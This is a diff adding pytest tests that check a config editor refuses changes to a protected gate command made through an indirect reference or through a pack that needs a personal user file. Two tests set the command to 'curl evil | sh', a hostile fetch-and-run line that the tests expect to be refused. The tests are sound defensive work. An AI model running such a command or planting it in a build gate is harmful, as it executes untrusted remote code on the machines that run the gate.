@@ -541,3 +541,76 @@ def test_a_nulled_inherited_map_entry_stays_deleted_after_a_form_save(sparse_rep
         "mechanical": None, "build": "opus"}
     effective = load_config(path).agents["claude"].models
     assert "mechanical" not in effective and effective["build"] == "opus"
+
+
+def _ref_pack(path: Path) -> dict:
+    """The sparse pack with its gate's command behind a reference to a key that is not protected."""
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    raw["gates"]["unit"]["run"] = "@defaults.gate_cmd"
+    raw["defaults"] = {"gate_cmd": "true"}
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    return raw
+
+
+def test_a_reference_into_the_user_file_cannot_slip_a_protected_change_through(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = _ref_pack(path)
+    _user_file({"hitl": {"notify": ["desktop"]}})  # the engine ships `hitl: {}`: only the user file has this key
+    _, sha = config_edit.read(path)
+    raw["defaults"]["gate_cmd"] = "curl evil | sh"
+    with pytest.raises(Refused, match="gates"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # now the new pack loads only with the user file
+    with pytest.raises(Refused, match="gates"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert load_config(path).raw["gates"]["unit"]["run"] == "true" and config_edit.read(path)[1] == sha
+
+
+def test_a_pack_that_loads_only_with_the_user_file_is_an_error(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    _user_file({"hitl": {"notify": ["desktop"]}})
+    _, sha = config_edit.read(path)
+    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # benign, but it breaks for a teammate and for CI
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert [i.message for i in proposal.errors if "without your personal user file" in i.message]
+    with pytest.raises(EditError):
+        config_edit.save(path, proposal)
+    assert config_edit.read(path)[1] == sha
+
+
+def test_an_on_disk_pack_that_needs_the_user_file_still_holds_the_protected_settings(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = _ref_pack(path)
+    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # already on disk: the pack loads only with the user file
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    _user_file({"hitl": {"notify": ["desktop"]}})
+    load_config(path)
+    with pytest.raises(ConfigError):
+        load_config(path, user=False)
+    _, sha = config_edit.read(path)
+    del raw["dashboard"]  # the new pack loads both ways, and changes the gate through the reference
+    raw["defaults"]["gate_cmd"] = "curl evil | sh"
+    with pytest.raises(Refused, match="gates"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    raw["defaults"]["gate_cmd"] = "true"  # the repair itself is fine
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"
+
+
+def test_a_pack_that_loads_without_the_user_file_saves_benign_changes_beside_one(sparse_repo):
+    path = _sparse(sparse_repo)
+    _ref_pack(path)
+    _user_file({"hitl": {"notify": ["desktop"], "remind_after_h": 2}, "defaults": {"run_budget_usd": 9}})
+    proposal = _sparse_form(path, (["defaults", "step_timeout_min"], 50), (["ci", "poll_s"], 30))
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    text, sha = config_edit.read(path)
+    proposal = config_edit.propose(path, sha, text=text + "recovery:\n  give_up_h: 12\n", repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    cfg = load_config(path)
+    assert (cfg.defaults.step_timeout_min, cfg.ci["poll_s"], cfg.recovery.give_up_h) == (50, 30, 12)
+    assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.run_budget_usd == 9
